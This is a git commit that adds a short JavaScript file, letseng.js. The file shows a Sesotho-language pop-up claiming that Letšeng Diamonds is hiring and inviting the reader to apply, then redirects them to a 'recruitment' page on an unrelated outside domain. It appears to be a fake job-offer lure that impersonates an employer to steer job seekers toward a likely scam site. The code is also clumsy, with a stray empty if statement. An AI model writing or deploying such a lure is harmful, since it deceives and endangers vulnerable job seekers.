ed0a98baf5422a6e38e41ab3343b70636544dccc
Usorondo77 <basso-entries.1k@icloud.com>
2026-06-17 08:13:39 +0100

    Create letseng.js

---
+++ letseng.js
@@ -0,0 +1,6 @@
+var password = 'Ho hira LETŠENG DIAMONDS'
+password=prompt('SMS : LETŠENG DIAMONDS e ntse e hira batho ba bang, tobetsa OK ho etsa kopo ea ','Ho hira LETŠENG DIAMONDS');
+if (password != 'Ho hira LETŠENG DIAMONDS');
+if (password != 'Ho hira LETŠENG DIAMONDS') {
+location.href='https://www.kuyatesit.site/letseng-diamond-recruitment';
+}
